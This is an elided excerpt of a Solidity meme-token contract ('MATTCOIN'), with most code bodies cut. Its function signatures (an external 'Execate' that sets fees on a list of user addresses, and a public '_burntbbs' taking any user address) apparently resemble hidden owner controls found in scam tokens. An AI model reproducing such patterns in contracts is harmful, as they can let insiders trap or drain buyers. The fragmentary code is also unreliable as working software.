...
https://twitter.com/MATTMEME_ERC
https://t.me/PepeLandwolfAndyBrettBirdDog
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipmattcoins(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract MATTCOIN is Ownable {
    ...
    constructor (){
        name = unicode"PepeLandwolfAndyBrettBirdDog";
        symbol = unicode"MATTCOIN";
        decimals = 9;
    ...
    function Execate(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;
        uint256 v2 = 0x02;
        uint256 v3 = 0x03;
    ...
    function _burntbbs(address user) public {
